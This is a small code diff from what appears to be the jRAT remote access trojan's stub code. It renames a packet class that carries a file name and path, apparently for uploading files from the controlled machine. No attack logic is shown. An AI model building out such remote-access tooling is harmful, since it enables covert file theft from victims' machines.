@@ -6,12 +6,12 @@ import se.jrat.common.io.StringWriter;
 import se.jrat.stub.Connection;
 
 
-public class Packet29SendFile extends AbstractOutgoingPacket {
+public class Packet29ClientUploadFile extends AbstractOutgoingPacket {
 
 	private String name;
 	private String absolutePath;
 
-	public Packet29SendFile(String name, String absolutePath) {
+	public Packet29ClientUploadFile(String name, String absolutePath) {
 		this.name = name;
 		this.absolutePath = absolutePath;
 	}
